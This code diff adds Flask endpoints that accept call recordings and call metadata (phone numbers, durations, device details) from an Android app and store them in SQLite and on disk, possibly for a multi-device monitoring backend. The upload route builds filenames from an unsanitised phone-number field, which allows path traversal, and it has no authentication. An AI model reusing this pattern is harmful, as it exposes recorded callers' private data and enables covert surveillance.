@@ -58,6 +58,142 @@ def get_server_ip():
     except:
         return "localhost:5000"
 
+
+@app.route('/call_recording/upload', methods=['POST'])
+def upload_call_recording():
+    """Upload call recording and data from Android app"""
+    try:
+        # Check if it's JSON data (call info) or file upload
+        if request.content_type and 'application/json' in request.content_type:
+            # JSON data received
+            call_data = request.get_json()
+            
+            print(f"📞 Call Data Received:")
+            print(f"  Event: {call_data.get('event_type')}")
+            print(f"  Phone: {call_data.get('phone_number')}")
+            print(f"  Type: {call_data.get('call_type')}")
+            print(f"  Duration: {call_data.get('call_duration')}ms")
+            print(f"  Device: {call_data.get('device_id')}")
+            
+            # Save call data to database
+            save_call_data_to_db(call_data)
+            
+            return jsonify({
+                'status': 'success', 
+                'message': 'Call data received',
+                'data_received': call_data
+            })
+        
+        else:
+            # File upload with form data
+            if 'recording' not in request.files:
+                return jsonify({'status': 'error', 'message': 'No recording file'})
+            
+            recording_file = request.files['recording']
+            phone_number = request.form.get('phone_number', 'Unknown')
+            call_type = request.form.get('call_type', 'Unknown')
+            call_duration = request.form.get('call_duration', '0')
+            device_id = request.form.get('device_id', 'unknown')
+            
+            if recording_file.filename == '':
+                return jsonify({'status': 'error', 'message': 'No file selected'})
+            
+            # Save recording file
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"{timestamp}_{phone_number}.wav"
+            filepath = os.path.join(CALL_RECORDINGS_DIR, filename)
+            recording_file.save(filepath)
+            
+            # Save to database
+            save_call_recording_to_db(phone_number, call_type, call_duration, filename, device_id)
+            
+            print(f"✅ Call recording uploaded: {filename}")
+            print(f"   Phone: {phone_number}, Type: {call_type}, Duration: {call_duration}ms")
+            
+            return jsonify({
+                'status': 'success', 
+                'message': 'Call recording uploaded',
+                'filename': filename,
+                'phone_number': phone_number,
+                'call_type': call_type,
+                'duration': call_duration
+            })
+            
+    except Exception as e:
+        print(f"❌ Call recording upload error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+def save_call_data_to_db(call_data):
+    """Save call data to database"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        
+        c.execute('''CREATE TABLE IF NOT EXISTS call_data
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                      event_type TEXT,
+                      phone_number TEXT,
+                      call_type TEXT,
+                      call_direction TEXT,
+                      call_start_time INTEGER,
+                      call_end_time INTEGER,
+                      call_duration INTEGER,
+                      device_id TEXT,
+                      device_model TEXT,
+                      android_version TEXT,
+                      timestamp DATETIME)''')
+        
+        c.execute('''INSERT INTO call_data 
+                     (event_type, phone_number, call_type, call_direction, 
+                      call_start_time, call_end_time, call_duration, 
+                      device_id, device_model, android_version, timestamp)
+                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                 (call_data.get('event_type'),
+                  call_data.get('phone_number'),
+                  call_data.get('call_type'),
+                  call_data.get('call_direction'),
+                  call_data.get('call_start_time'),
+                  call_data.get('call_end_time'),
+                  call_data.get('call_duration'),
+                  call_data.get('device_id'),
+                  call_data.get('device_model'),
+                  call_data.get('android_version'),
+                  datetime.now()))
+        
+        conn.commit()
+        conn.close()
+        print(f"✅ Call data saved to database: {call_data.get('event_type')}")
+        
+    except Exception as e:
+        print(f"❌ Database save error: {e}")
+
+def save_call_recording_to_db(phone_number, call_type, duration, filename, device_id):
+    """Save call recording info to database"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        
+        c.execute('''CREATE TABLE IF NOT EXISTS call_recordings
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                      phone_number TEXT,
+                      call_type TEXT,
+                      duration TEXT,
+                      filename TEXT,
+                      device_id TEXT,
+                      timestamp DATETIME)''')
+        
+        c.execute('''INSERT INTO call_recordings 
+                     (phone_number, call_type, duration, filename, device_id, timestamp)
+                     VALUES (?, ?, ?, ?, ?, ?)''',
+                 (phone_number, call_type, duration, filename, device_id, datetime.now()))
+        
+        conn.commit()
+        conn.close()
+        print(f"✅ Recording info saved to database: {filename}")
+        
+    except Exception as e:
+        print(f"❌ Recording database save error: {e}")
+
 # ================== CALL RECORDING ROUTES ==================
 
 @app.route('/call_recording', methods=['GET'])
